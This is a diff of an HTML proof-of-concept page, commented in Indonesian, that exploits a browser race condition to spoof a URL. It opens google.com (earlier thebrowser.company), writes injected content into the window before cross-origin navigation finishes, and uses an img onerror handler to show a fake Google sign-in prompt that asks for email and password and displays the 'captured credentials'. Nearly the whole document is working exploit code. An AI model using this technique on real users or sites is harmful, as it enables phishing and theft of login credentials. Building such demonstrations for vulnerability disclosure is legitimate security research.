@@ -1,10 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Spoofing PoC</title>
+  <title>Spoofing PoC - Combined</title>
   <style>
     body {
       display: flex;
@@ -12,41 +11,48 @@
       align-items: center;
       min-height: 100vh;
       margin: 0;
+      font-family: sans-serif;
     }
-
-    body > button {
+    button {
       padding: 12px 24px;
       font-size: 18px;
+      cursor: pointer;
     }
   </style>
 </head>
-
 <body>
-  <button onclick="spoof()">Click to spoof</button>
+
+  <button onclick="executeSpoof()">Start Test</button>
 
   <script>
-    function spoof() {
-      // Buka page baru pointing ke target (akan menjadi spoofed URL)
-      let win = window.open("https://thebrowser.company/", "_blank");
+    function executeSpoof() {
+      // 1. Menggunakan _top / window.open dengan path spesifik untuk menghindari Universal Links
+      let win = window.open('https://www.google.com/about/', '_top');
 
-      // Setelah 50ms, injeksikan konten sebelum navigasi selesai
+      // 2. Race Condition: Injeksikan DOM sebelum navigasi cross-origin diselesaikan penuh oleh browser
       setTimeout(() => {
         try {
           win.document.write(`
-  <h1>This is not The Browser Company!</h1>
-<button onclick="
-  let username = prompt('Enter your username');
-  let password = prompt('Enter your password');
-  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
-">Click me</button>
-            `);
+            <body style="margin:0; padding:20px; text-align:center;">
+              <h2>Loading Google Services...</h2>
+              <!-- 3. Injeksi Image Onerror untuk memicu prompt modal tanpa origin attribution -->
+              <img src="" onerror="
+                setTimeout(function() {
+                  let user = prompt('Sign into your account in order to access www.google.com', 'E-mail / Password');
+                  if (user) {
+                    alert('Captured Credentials: ' + user);
+                  }
+                }, 100);
+              ">
+            </body>
+          `);
           win.document.close();
         } catch (e) {
-          console.warn("Blocked by browser protections:", e);
+          console.warn("Cross-Origin restriction enforced:", e);
         }
       }, 50);
     }
   </script>
-</body>
 
+</body>
 </html>
